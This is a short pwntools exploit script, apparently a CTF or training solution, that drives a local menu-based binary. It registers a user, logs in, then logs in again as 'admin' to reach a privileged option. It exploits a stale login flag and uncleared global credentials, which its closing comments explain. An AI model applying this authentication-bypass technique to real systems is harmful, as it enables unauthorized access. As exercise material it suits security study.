#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)

def register(username, password):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", username.encode())
    io.sendlineafter(b": ", password.encode())
def login(username, password):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", username.encode())
    io.sendlineafter(b": ", password.encode())
def read_docs():
    io.sendlineafter(b"> ", b"3")
def marker():
    io.sendlineafter(b"> ", b"4")
def exit_program():
    io.sendlineafter(b"> ", b"5")

io = process(exe.path)

username = "tmp_user"
password = "tmp_psw"

register(username, password)

#Set is_logged to 1
login(username, password)

#Set username to "admin"
login("admin", password)

marker()

io.wait_for_close()

exit(io.poll())

#Logic error: is_logged is never set to 0, and after a login, i can still do an other register/login.
#Username and password are global and never cleaned.